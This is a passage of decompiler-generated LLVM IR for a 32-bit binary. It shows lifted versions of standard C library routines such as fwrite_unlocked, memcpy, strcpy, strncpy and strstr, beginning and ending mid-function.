  %v1_804f16e = icmp eq i1 %v8_804f16d, false
  br i1 %v1_804f16e, label %dec_label_pc_804f16b.dec_label_pc_804f16d_crit_edge.dec_label_pc_804f137_crit_edge, label %dec_label_pc_804f170

dec_label_pc_804f16b.dec_label_pc_804f16d_crit_edge.dec_label_pc_804f137_crit_edge: ; preds = %dec_label_pc_804f16b.dec_label_pc_804f16d_crit_edge
  %v0_804f137.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_804f137

dec_label_pc_804f170:                             ; preds = %dec_label_pc_804f16d.preheader, %dec_label_pc_804f13f, %dec_label_pc_804f16b.dec_label_pc_804f16d_crit_edge, %dec_label_pc_804f16b, %dec_label_pc_804f15e
  %v0_804f170 = load i32, i32* @ebx, align 4
  %v1_804f170 = load i32, i32* @edi, align 4
  %tmp22 = icmp ugt i32 %v0_804f170, %v1_804f170
  br i1 %tmp22, label %dec_label_pc_804f174, label %dec_label_pc_804f179

dec_label_pc_804f174:                             ; preds = %dec_label_pc_804f170
  %v1_804f174 = inttoptr i32 %v0_804f170 to i8*
  store i8 0, i8* %v1_804f174, align 1
  %v0_804f17e.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804f17b

dec_label_pc_804f179:                             ; preds = %dec_label_pc_804f170, %dec_label_pc_804f15e, %entry
  br label %dec_label_pc_804f17b

dec_label_pc_804f17b:                             ; preds = %dec_label_pc_804f174, %dec_label_pc_804f179
  %v0_804f17e = phi i32 [ %v0_804f17e.pre, %dec_label_pc_804f174 ], [ 0, %dec_label_pc_804f179 ]
  store i32 %v0_804f17e, i32* %eax.global-to-local, align 4
  store i32 %v0_804f11c, i32* @ebp, align 4
  ret i32 %v0_804f17e

; uselistorder directives
  uselistorder i32 %v0_804f17e, { 1, 0 }
  uselistorder i32 %v0_804f170, { 1, 0 }
  uselistorder i32 %v1_804f16d, { 1, 0 }
  uselistorder i32 %v0_804f151, { 0, 2, 1 }
  uselistorder i32 %v0_804f137, { 1, 0 }
  uselistorder label %dec_label_pc_804f17b, { 1, 0 }
  uselistorder label %dec_label_pc_804f170, { 2, 3, 4, 1, 0 }
  uselistorder label %dec_label_pc_804f16b.dec_label_pc_804f16d_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_804f137, { 1, 0 }
}

define i32 @__GI_fputs_unlocked(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_804f188 = load i32, i32* @esi, align 4
  %v0_804f189 = load i32, i32* @ebx, align 4
  store i32 %v0_804f189, i32* %stack_var_-8, align 4
  %v4_804f18d = ptrtoint i8* %arg1 to i32
  store i32 %v4_804f18d, i32* @ebx, align 4
  %v3_804f192 = call i32 @strlen(i8* %arg1)
  store i32 %v3_804f192, i32* @esi, align 4
  %v0_804f1a3 = load i32, i32* @ebx, align 4
  %v6_804f1a4 = call i32 @__GI_fwrite_unlocked(i32 %v0_804f1a3, i64 1, i32 %v3_804f192, i32 %arg2)
  %v1_804f1af = load i32, i32* @esi, align 4
  %v12_804f1af = icmp eq i32 %v6_804f1a4, %v1_804f1af
  %v1_804f1b1 = icmp eq i1 %v12_804f1af, false
  br i1 %v1_804f1b1, label %dec_label_pc_804f1b5, label %dec_label_pc_804f1b3

dec_label_pc_804f1b3:                             ; preds = %entry
  br label %dec_label_pc_804f1b5

dec_label_pc_804f1b5:                             ; preds = %entry, %dec_label_pc_804f1b3
  %v0_804f1b5 = phi i32 [ -1, %entry ], [ %v6_804f1a4, %dec_label_pc_804f1b3 ]
  %v2_804f1b8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804f1b8, i32* @ebx, align 4
  store i32 %v0_804f188, i32* @esi, align 4
  ret i32 %v0_804f1b5

; uselistorder directives
  uselistorder i32 %v6_804f1a4, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804f1b5, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i64 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v0_804f1bc = load i32, i32* @edi, align 4
  %v0_804f1bd = load i32, i32* @esi, align 4
  %v0_804f1be = load i32, i32* @ebx, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v4_804f1c3 = trunc i64 %arg2 to i32
  store i32 %v4_804f1c3, i32* @esi, align 4
  store i32 %arg3, i32* @edi, align 4
  %v1_804f1cb = inttoptr i32 %arg4 to i16*
  %v2_804f1cb = load i16, i16* %v1_804f1cb, align 2
  %v1_804f1ce = and i16 %v2_804f1cb, 192
  %v6_804f1d3 = icmp eq i16 %v1_804f1ce, 192
  br i1 %v6_804f1d3, label %dec_label_pc_804f1ee, label %dec_label_pc_804f1da

dec_label_pc_804f1da:                             ; preds = %entry
  %v0_804f1da = load i32, i32* @edx, align 4
  store i32 %arg4, i32* %stack_var_-28, align 4
  %v9_804f1e2 = call i32 @__stdio_trans2w_o(i16* %v1_804f1cb, i32 128, i32 %v0_804f1da, i32 %v0_804f1da, i32 %v0_804f1be, i32 %v0_804f1bd, i32 %v0_804f1bc)
  %v1_804f1ea = icmp eq i32 %v9_804f1e2, 0
  %v1_804f1ec = icmp eq i1 %v1_804f1ea, false
  br i1 %v1_804f1ec, label %dec_label_pc_804f22a, label %dec_label_pc_804f1ee

dec_label_pc_804f1ee:                             ; preds = %dec_label_pc_804f1da, %entry
  %v2_804f1ee = icmp eq i32 %v4_804f1c3, 0
  br i1 %v2_804f1ee, label %dec_label_pc_804f22a, label %dec_label_pc_804f1f2

dec_label_pc_804f1f2:                             ; preds = %dec_label_pc_804f1ee
  %v1_804f1f2 = icmp eq i32 %arg3, 0
  br i1 %v1_804f1f2, label %dec_label_pc_804f22a, label %dec_label_pc_804f1f6

dec_label_pc_804f1f6:                             ; preds = %dec_label_pc_804f1f2
  %v9_804f1fb = udiv i64 4294967295, %arg2
  %v10_804f1fb = trunc i64 %v9_804f1fb to i32
  %v6_804f1ff = icmp ult i32 %v10_804f1fb, %arg3
  br i1 %v6_804f1ff, label %dec_label_pc_804f21b, label %dec_label_pc_804f201

dec_label_pc_804f201:                             ; preds = %dec_label_pc_804f1f6
  %sext = mul i64 %arg2, 4294967296
  %v2_804f204 = sdiv i64 %sext, 4294967296
  %v3_804f204 = sext i32 %arg3 to i64
  %v4_804f204 = mul nsw i64 %v3_804f204, %v2_804f204
  %v5_804f204 = trunc i64 %v4_804f204 to i32
  %v0_804f207 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %stack_var_-28, align 4
  %v5_804f20d = call i32 @__stdio_fwrite(i32 %arg1, i32 %v5_804f204, i32 %v0_804f207, i32 %v10_804f1fb)
  %v6_804f20d = sext i32 %v5_804f20d to i64
  %v10_804f214 = udiv i64 %v6_804f20d, %arg2
  %v11_804f214 = trunc i64 %v10_804f214 to i32
  br label %dec_label_pc_804f22c

dec_label_pc_804f21b:                             ; preds = %dec_label_pc_804f1f6
  %v0_804f21b = load i32, i32* @ebx, align 4
  %v1_804f21b = inttoptr i32 %v0_804f21b to i16*
  %v2_804f21b = load i16, i16* %v1_804f21b, align 2
  %v3_804f21b = or i16 %v2_804f21b, 8
  store i16 %v3_804f21b, i16* %v1_804f21b, align 2
  %v0_804f21f = load i32, i32* %stack_var_-28, align 4
  %v1_804f21f = call i32 @__errno_location(i32 %v0_804f21f)
  %v1_804f224 = inttoptr i32 %v1_804f21f to i32*
  store i32 22, i32* %v1_804f224, align 4
  br label %dec_label_pc_804f22a

dec_label_pc_804f22a:                             ; preds = %dec_label_pc_804f1f2, %dec_label_pc_804f1ee, %dec_label_pc_804f1da, %dec_label_pc_804f21b
  br label %dec_label_pc_804f22c

dec_label_pc_804f22c:                             ; preds = %dec_label_pc_804f201, %dec_label_pc_804f22a
  %v0_804f22f = phi i32 [ %v11_804f214, %dec_label_pc_804f201 ], [ 0, %dec_label_pc_804f22a ]
  store i32 %v0_804f1bd, i32* @esi, align 4
  store i32 %v0_804f1bc, i32* @edi, align 4
  ret i32 %v0_804f22f

; uselistorder directives
  uselistorder i32 %v0_804f1da, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__stdio_fwrite, { 5, 4, 3, 1, 0, 6, 2 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder i64 %arg2, { 2, 0, 1, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804f22c, { 1, 0 }
  uselistorder label %dec_label_pc_804f22a, { 3, 0, 1, 2 }
}

define i32 @memcpy(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804f231 = load i32, i32* @esi, align 4
  store i32 %v0_804f231, i32* %stack_var_-8, align 4
  %sext = mul i32 %arg3, 16777216
  %v4_804f232 = sdiv i32 %sext, 16777216
  store i32 %v4_804f232, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_804f23c = ptrtoint i16* %arg1 to i32
  store i32 %v4_804f23c, i32* %edi.global-to-local, align 4
  %v2_804f240 = udiv i32 %v4_804f232, 4
  %v3_804f243 = inttoptr i32 %arg2 to i8*
  %v4_804f243 = bitcast i16* %arg1 to i8*
  %v5_804f243 = call i8* @_memcpy(i8* %v4_804f243, i8* %v3_804f243, i32 %v2_804f240)
  %v6_804f243 = ptrtoint i8* %v5_804f243 to i32
  store i32 %v6_804f243, i32* @ecx, align 4
  %v0_804f245 = load i32, i32* %eax.global-to-local, align 4
  %v2_804f245 = and i32 %v0_804f245, 2
  %v3_804f245 = icmp eq i32 %v2_804f245, 0
  br i1 %v3_804f245, label %dec_label_pc_804f24b, label %dec_label_pc_804f249

dec_label_pc_804f249:                             ; preds = %entry
  %v0_804f249 = load i32, i32* %esi.global-to-local, align 4
  %v1_804f249 = inttoptr i32 %v0_804f249 to i16*
  %v2_804f249 = load i16, i16* %v1_804f249, align 2
  %v3_804f249 = load i32, i32* %edi.global-to-local, align 4
  %v4_804f249 = inttoptr i32 %v3_804f249 to i16*
  store i16 %v2_804f249, i16* %v4_804f249, align 2
  %v5_804f249 = load i32, i32* %edi.global-to-local, align 4
  %v6_804f249 = load i32, i32* %esi.global-to-local, align 4
  %v7_804f249 = load i1, i1* @df, align 1
  %v8_804f249 = select i1 %v7_804f249, i32 -2, i32 2
  %v9_804f249 = add i32 %v8_804f249, %v5_804f249
  %v10_804f249 = add i32 %v8_804f249, %v6_804f249
  store i32 %v9_804f249, i32* %edi.global-to-local, align 4
  store i32 %v10_804f249, i32* %esi.global-to-local, align 4
  %v0_804f24b.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f24b

dec_label_pc_804f24b:                             ; preds = %entry, %dec_label_pc_804f249
  %v0_804f24b = phi i32 [ %v0_804f245, %entry ], [ %v0_804f24b.pre, %dec_label_pc_804f249 ]
  %v2_804f24b = urem i32 %v0_804f24b, 2
  %v3_804f24b = icmp eq i32 %v2_804f24b, 0
  br i1 %v3_804f24b, label %dec_label_pc_804f250, label %dec_label_pc_804f24f

dec_label_pc_804f24f:                             ; preds = %dec_label_pc_804f24b
  %v0_804f24f = load i32, i32* %esi.global-to-local, align 4
  %v1_804f24f = inttoptr i32 %v0_804f24f to i8*
  %v2_804f24f = load i8, i8* %v1_804f24f, align 1
  %v3_804f24f = load i32, i32* %edi.global-to-local, align 4
  %v4_804f24f = inttoptr i32 %v3_804f24f to i8*
  store i8 %v2_804f24f, i8* %v4_804f24f, align 1
  %v5_804f24f = load i32, i32* %edi.global-to-local, align 4
  %v6_804f24f = load i32, i32* %esi.global-to-local, align 4
  %v7_804f24f = load i1, i1* @df, align 1
  %v8_804f24f = select i1 %v7_804f24f, i32 -1, i32 1
  %v9_804f24f = add i32 %v8_804f24f, %v5_804f24f
  %v10_804f24f = add i32 %v8_804f24f, %v6_804f24f
  store i32 %v9_804f24f, i32* %edi.global-to-local, align 4
  store i32 %v10_804f24f, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804f250

dec_label_pc_804f250:                             ; preds = %dec_label_pc_804f24b, %dec_label_pc_804f24f
  store i32 %v4_804f23c, i32* %eax.global-to-local, align 4
  %v2_804f254 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804f254, i32* @esi, align 4
  ret i32 %v4_804f23c

; uselistorder directives
  uselistorder i32* %esi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %eax.global-to-local, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_804f250, { 1, 0 }
  uselistorder label %dec_label_pc_804f24b, { 1, 0 }
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_804f258 = load i32, i32* @edi, align 4
  %v4_804f261 = ptrtoint i8* %arg1 to i32
  %v5_804f265 = call i8* @_memset(i8* %arg1, i32 %arg2, i32 %arg3)
  %v6_804f265 = ptrtoint i8* %v5_804f265 to i32
  store i32 %v6_804f265, i32* @ecx, align 4
  store i32 %v0_804f258, i32* @edi, align 4
  ret i32 %v4_804f261

; uselistorder directives
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @__GI_strchr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_804f271 = ptrtoint i8* %arg1 to i32
  %v2_804f279 = mul i32 %arg2, 256
  %v3_804f279 = and i32 %v2_804f279, 65280
  %v4_804f279 = and i32 %arg2, -65281
  %v5_804f279 = or i32 %v3_804f279, %v4_804f279
  %v8_804f27b.pre = load i1, i1* @df, align 1
  %v9_804f27b = select i1 %v8_804f27b.pre, i32 -1, i32 1
  br label %dec_label_pc_804f27b

dec_label_pc_804f27b:                             ; preds = %dec_label_pc_804f280, %entry
  %v4_804f27b = phi i32 [ %v6_804f27b, %dec_label_pc_804f280 ], [ %v5_804f279, %entry ]
  %v7_804f27b = phi i32 [ %v10_804f27b, %dec_label_pc_804f280 ], [ %v4_804f271, %entry ]
  %v1_804f27b = inttoptr i32 %v7_804f27b to i8*
  %v2_804f27b = load i8, i8* %v1_804f27b, align 1
  %v10_804f27b = add i32 %v7_804f27b, %v9_804f27b
  %v3_804f27c = udiv i32 %v4_804f27b, 256
  %v4_804f27c = trunc i32 %v3_804f27c to i8
  %v16_804f27c = icmp eq i8 %v2_804f27b, %v4_804f27c
  br i1 %v16_804f27c, label %dec_label_pc_804f289.loopexit, label %dec_label_pc_804f280

dec_label_pc_804f280:                             ; preds = %dec_label_pc_804f27b
  %v3_804f27b = zext i8 %v2_804f27b to i32
  %v5_804f27b = and i32 %v4_804f27b, -256
  %v6_804f27b = or i32 %v3_804f27b, %v5_804f27b
  %v4_804f280 = icmp eq i8 %v2_804f27b, 0
  %v1_804f282 = icmp eq i1 %v4_804f280, false
  br i1 %v1_804f282, label %dec_label_pc_804f27b, label %dec_label_pc_804f284

dec_label_pc_804f284:                             ; preds = %dec_label_pc_804f280
  br label %dec_label_pc_804f289

dec_label_pc_804f289.loopexit:                    ; preds = %dec_label_pc_804f27b
  %phitmp = add i32 %v10_804f27b, -1
  br label %dec_label_pc_804f289

dec_label_pc_804f289:                             ; preds = %dec_label_pc_804f289.loopexit, %dec_label_pc_804f284
  %v0_804f289 = phi i32 [ 0, %dec_label_pc_804f284 ], [ %phitmp, %dec_label_pc_804f289.loopexit ]
  ret i32 %v0_804f289

; uselistorder directives
  uselistorder i8 %v2_804f27b, { 1, 2, 0 }
  uselistorder i32 %v4_804f27b, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804f291 = load i32, i32* @esi, align 4
  store i32 %v0_804f291, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_804f299 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804f299, i32* %edi.global-to-local, align 4
  %v4_804f29d.pre = load i32, i32* @eax, align 4
  %v8_804f29d.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_804f29d

dec_label_pc_804f29d:                             ; preds = %dec_label_pc_804f29d.dec_label_pc_804f29d_crit_edge, %entry
  %v2_804f29e = phi i32 [ %v7_804f29e, %dec_label_pc_804f29d.dec_label_pc_804f29d_crit_edge ], [ %v4_804f299, %entry ]
  %v8_804f29d = phi i1 [ %v5_804f29e, %dec_label_pc_804f29d.dec_label_pc_804f29d_crit_edge ], [ %v8_804f29d.pre, %entry ]
  %v4_804f29d = phi i32 [ %v0_804f29f, %dec_label_pc_804f29d.dec_label_pc_804f29d_crit_edge ], [ %v4_804f29d.pre, %entry ]
  %v7_804f29d = phi i32 [ %v0_804f29d.pre, %dec_label_pc_804f29d.dec_label_pc_804f29d_crit_edge ], [ %arg2, %entry ]
  %v1_804f29d = inttoptr i32 %v7_804f29d to i8*
  %v2_804f29d = load i8, i8* %v1_804f29d, align 1
  %v3_804f29d = zext i8 %v2_804f29d to i32
  %v5_804f29d = and i32 %v4_804f29d, -256
  %v6_804f29d = or i32 %v3_804f29d, %v5_804f29d
  store i32 %v6_804f29d, i32* %eax.global-to-local, align 4
  %v9_804f29d = select i1 %v8_804f29d, i32 -1, i32 1
  %v10_804f29d = add i32 %v7_804f29d, %v9_804f29d
  store i32 %v10_804f29d, i32* %esi.global-to-local, align 4
  %v3_804f29e = inttoptr i32 %v2_804f29e to i8*
  store i8 %v2_804f29d, i8* %v3_804f29e, align 1
  %v4_804f29e = load i32, i32* %edi.global-to-local, align 4
  %v5_804f29e = load i1, i1* @df, align 1
  %v6_804f29e = select i1 %v5_804f29e, i32 -1, i32 1
  %v7_804f29e = add i32 %v6_804f29e, %v4_804f29e
  store i32 %v7_804f29e, i32* %edi.global-to-local, align 4
  %v0_804f29f = load i32, i32* %eax.global-to-local, align 4
  %v3_804f29f = trunc i32 %v0_804f29f to i8
  %v4_804f29f = icmp eq i8 %v3_804f29f, 0
  %v1_804f2a1 = icmp eq i1 %v4_804f29f, false
  br i1 %v1_804f2a1, label %dec_label_pc_804f29d.dec_label_pc_804f29d_crit_edge, label %dec_label_pc_804f2a3

dec_label_pc_804f29d.dec_label_pc_804f29d_crit_edge: ; preds = %dec_label_pc_804f29d
  %v0_804f29d.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804f29d

dec_label_pc_804f2a3:                             ; preds = %dec_label_pc_804f29d
  store i32 %v4_804f299, i32* %eax.global-to-local, align 4
  %v2_804f2a7 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804f2a7, i32* @edx, align 4
  %v2_804f2a8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804f2a8, i32* @esi, align 4
  ret i32 %v4_804f299

; uselistorder directives
  uselistorder i32 %v0_804f29f, { 1, 0 }
  uselistorder i32 %v7_804f29e, { 1, 0 }
  uselistorder i1 %v5_804f29e, { 1, 0 }
  uselistorder i32 %v4_804f299, { 1, 2, 0, 3 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @strncpy(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804f2c1 = load i32, i32* @esi, align 4
  store i32 %v0_804f2c1, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_804f2cd = ptrtoint i8* %arg1 to i32
  store i32 %v4_804f2cd, i32* %edi.global-to-local, align 4
  %v1_804f2d1 = add i32 %arg3, 1
  store i32 %v1_804f2d1, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804f2d2

dec_label_pc_804f2d2:                             ; preds = %dec_label_pc_804f2d5, %entry
  %v3_804f2d6 = phi i32 [ %v4_804f2cd, %entry ], [ %v8_804f2d6, %dec_label_pc_804f2d5 ]
  %v0_804f2d2 = phi i32 [ %v1_804f2d1, %entry ], [ %v0_804f2d2.pre, %dec_label_pc_804f2d5 ]
  %v1_804f2d2 = add i32 %v0_804f2d2, -1
  %v8_804f2d2 = icmp eq i32 %v1_804f2d2, 0
  store i32 %v1_804f2d2, i32* %ecx.global-to-local, align 4
  br i1 %v8_804f2d2, label %.loopexit, label %dec_label_pc_804f2d5

dec_label_pc_804f2d5:                             ; preds = %dec_label_pc_804f2d2
  %v0_804f2d5 = load i32, i32* %esi.global-to-local, align 4
  %v1_804f2d5 = inttoptr i32 %v0_804f2d5 to i8*
  %v2_804f2d5 = load i8, i8* %v1_804f2d5, align 1
  %v10_804f2d5 = load i1, i1* @df, align 1
  %v11_804f2d5 = select i1 %v10_804f2d5, i32 -1, i32 1
  %v12_804f2d5 = add i32 %v11_804f2d5, %v0_804f2d5
  store i32 %v12_804f2d5, i32* %esi.global-to-local, align 4
  %v4_804f2d6 = inttoptr i32 %v3_804f2d6 to i8*
  store i8 %v2_804f2d5, i8* %v4_804f2d6, align 1
  %v5_804f2d6 = load i32, i32* %edi.global-to-local, align 4
  %v6_804f2d6 = load i1, i1* @df, align 1
  %v7_804f2d6 = select i1 %v6_804f2d6, i32 -1, i32 1
  %v8_804f2d6 = add i32 %v7_804f2d6, %v5_804f2d6
  store i32 %v8_804f2d6, i32* %edi.global-to-local, align 4
  %v6_804f2d7 = icmp eq i8 %v2_804f2d5, 0
  %v1_804f2d9 = icmp eq i1 %v6_804f2d7, false
  %v0_804f2d2.pre = load i32, i32* %ecx.global-to-local, align 4
  br i1 %v1_804f2d9, label %dec_label_pc_804f2d2, label %dec_label_pc_804f2db

dec_label_pc_804f2db:                             ; preds = %dec_label_pc_804f2d5
  %v1_804f2db = add i32 %v0_804f2d2.pre, -1
  store i32 %v1_804f2db, i32* %ecx.global-to-local, align 4
  %v2_804f2dc = sext i8 %v2_804f2d5 to i32
  %v4_804f2dc = inttoptr i32 %v8_804f2d6 to i8*
  %v5_804f2dc = call i8* @_memset(i8* %v4_804f2dc, i32 %v2_804f2dc, i32 %v1_804f2db)
  %v6_804f2dc = ptrtoint i8* %v5_804f2dc to i32
  store i32 %v6_804f2dc, i32* %ecx.global-to-local, align 4
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_804f2d2, %dec_label_pc_804f2db
  %v2_804f2e2 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804f2e2, i32* @edx, align 4
  %v2_804f2e3 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804f2e3, i32* @esi, align 4
  ret i32 %v4_804f2cd

; uselistorder directives
  uselistorder i32 %v8_804f2d6, { 0, 2, 1 }
  uselistorder i8 %v2_804f2d5, { 0, 2, 1 }
  uselistorder i32 %v1_804f2d2, { 1, 0 }
  uselistorder i32 %v4_804f2cd, { 1, 0, 2 }
  uselistorder label %.loopexit, { 1, 0 }
}

define i32 @strnlen() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i8* @__decompiler_undefined_function_2()
  %v4_804f2e8 = ptrtoint i8* %tmp4 to i32
  %v8_804f2fb5 = icmp eq i32 %tmp, 0
  %v1_804f2fc6 = icmp eq i1 %v8_804f2fb5, false
  br i1 %v1_804f2fc6, label %dec_label_pc_804f2f5, label %dec_label_pc_804f2fe

dec_label_pc_804f2f5:                             ; preds = %entry, %dec_label_pc_804f2fa
  %v1_804f2fb8 = phi i32 [ %v1_804f2fb, %dec_label_pc_804f2fa ], [ %tmp, %entry ]
  %v0_804f2fe7 = phi i32 [ %v1_804f2fa, %dec_label_pc_804f2fa ], [ %v4_804f2e8, %entry ]
  %v1_804f2f5 = inttoptr i32 %v0_804f2fe7 to i8*
  %v2_804f2f5 = load i8, i8* %v1_804f2f5, align 1
  %v3_804f2f5 = icmp eq i8 %v2_804f2f5, 0
  br i1 %v3_804f2f5, label %dec_label_pc_804f2fe, label %dec_label_pc_804f2fa

dec_label_pc_804f2fa:                             ; preds = %dec_label_pc_804f2f5
  %v1_804f2fa = add i32 %v0_804f2fe7, 1
  %v1_804f2fb = add i32 %v1_804f2fb8, -1
  %v8_804f2fb = icmp eq i32 %v1_804f2fb, 0
  %v1_804f2fc = icmp eq i1 %v8_804f2fb, false
  br i1 %v1_804f2fc, label %dec_label_pc_804f2f5, label %dec_label_pc_804f2fe

dec_label_pc_804f2fe:                             ; preds = %dec_label_pc_804f2fa, %dec_label_pc_804f2f5, %entry
  %v0_804f2fe.lcssa = phi i32 [ %v4_804f2e8, %entry ], [ %v0_804f2fe7, %dec_label_pc_804f2f5 ], [ %v1_804f2fa, %dec_label_pc_804f2fa ]
  %v2_804f2fe = sub i32 %v0_804f2fe.lcssa, %v4_804f2e8
  ret i32 %v2_804f2fe

; uselistorder directives
  uselistorder i32 %v1_804f2fb, { 1, 0 }
  uselistorder i32 %v0_804f2fe7, { 0, 2, 1 }
  uselistorder i32 %v4_804f2e8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f2f5, { 1, 0 }
}

define i32 @strstr(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %v0_804f307 = load i32, i32* @ebx, align 4
  %v4_804f30b = ptrtoint i8* %arg2 to i32
  %v2_804f313 = load i8, i8* %arg2, align 1
  %v1_804f316 = icmp eq i8 %v2_804f313, 0
  br i1 %v1_804f316, label %dec_label_pc_804f3c3, label %dec_label_pc_804f31e

dec_label_pc_804f31e:                             ; preds = %entry
  %v1_804f31e = add i32 %arg1, -1
  br label %dec_label_pc_804f31f

dec_label_pc_804f31f:                             ; preds = %dec_label_pc_804f32b, %dec_label_pc_804f31e
  %v0_804f31f = phi i32 [ %v1_804f31f, %dec_label_pc_804f32b ], [ %v1_804f31e, %dec_label_pc_804f31e ]
  %v1_804f31f = add i32 %v0_804f31f, 1
  %v1_804f320 = inttoptr i32 %v1_804f31f to i8*
  %v2_804f320 = load i8, i8* %v1_804f320, align 1
  %v1_804f323 = icmp eq i8 %v2_804f320, 0
  br i1 %v1_804f323, label %dec_label_pc_804f3c1, label %dec_label_pc_804f32b

dec_label_pc_804f32b:                             ; preds = %dec_label_pc_804f31f
  %v12_804f32b = icmp eq i8 %v2_804f320, %v2_804f313
  %v1_804f32d = icmp eq i1 %v12_804f32b, false
  br i1 %v1_804f32d, label %dec_label_pc_804f31f, label %dec_label_pc_804f32f

dec_label_pc_804f32f:                             ; preds = %dec_label_pc_804f32b
  %v1_804f32f = add i32 %v4_804f30b, 1
  %v2_804f336 = inttoptr i32 %v1_804f32f to i8*
  %v3_804f336 = load i8, i8* %v2_804f336, align 1
  %v1_804f33d = icmp eq i8 %v3_804f336, 0
  br i1 %v1_804f33d, label %dec_label_pc_804f3c3, label %dec_label_pc_804f341

dec_label_pc_804f341:                             ; preds = %dec_label_pc_804f32f
  %v1_804f341 = add i32 %v0_804f31f, 2
  %v1_804f382 = add i32 %v4_804f30b, 2
  %v2_804f382 = inttoptr i32 %v1_804f382 to i8*
  br label %dec_label_pc_804f374

dec_label_pc_804f34c:                             ; preds = %dec_label_pc_804f3b9
  %v2_804f34c = inttoptr i32 %v0_804f387 to i8*
  %v3_804f34c = load i8, i8* %v2_804f34c, align 1
  br label %dec_label_pc_804f369.preheader

dec_label_pc_804f369.preheader:                   ; preds = %dec_label_pc_804f34c, %dec_label_pc_804f374
  %v0_804f355.ph.in = phi i8 [ %v0_804f36927.in, %dec_label_pc_804f374 ], [ %v3_804f34c, %dec_label_pc_804f34c ]
  %v12_804f36954 = icmp eq i8 %v0_804f355.ph.in, %v2_804f313
  %v1_804f36b55 = icmp eq i1 %v12_804f36954, false
  br i1 %v1_804f36b55, label %dec_label_pc_804f355, label %dec_label_pc_804f36d

dec_label_pc_804f355:                             ; preds = %dec_label_pc_804f369.preheader, %dec_label_pc_804f365
  %v0_804f35557.in = phi i8 [ %v2_804f366, %dec_label_pc_804f365 ], [ %v0_804f355.ph.in, %dec_label_pc_804f369.preheader ]
  %v0_804f35956 = phi i32 [ %v1_804f365, %dec_label_pc_804f365 ], [ %v0_804f387, %dec_label_pc_804f369.preheader ]
  %v1_804f355 = icmp eq i8 %v0_804f35557.in, 0
  br i1 %v1_804f355, label %dec_label_pc_804f3c1, label %dec_label_pc_804f359

dec_label_pc_804f359:                             ; preds = %dec_label_pc_804f355
  %v1_804f359 = add i32 %v0_804f35956, 1
  %v1_804f35a = inttoptr i32 %v1_804f359 to i8*
  %v2_804f35a = load i8, i8* %v1_804f35a, align 1
  %v12_804f35d = icmp eq i8 %v2_804f35a, %v2_804f313
  br i1 %v12_804f35d, label %dec_label_pc_804f36d, label %dec_label_pc_804f361

dec_label_pc_804f361:                             ; preds = %dec_label_pc_804f359
  %v1_804f361 = icmp eq i8 %v2_804f35a, 0
  br i1 %v1_804f361, label %dec_label_pc_804f3c1, label %dec_label_pc_804f365

dec_label_pc_804f365:                             ; preds = %dec_label_pc_804f361
  %v1_804f365 = add i32 %v0_804f35956, 2
  %v1_804f366 = inttoptr i32 %v1_804f365 to i8*
  %v2_804f366 = load i8, i8* %v1_804f366, align 1
  %v12_804f369 = icmp eq i8 %v2_804f366, %v2_804f313
  %v1_804f36b = icmp eq i1 %v12_804f369, false
  br i1 %v1_804f36b, label %dec_label_pc_804f355, label %dec_label_pc_804f36d
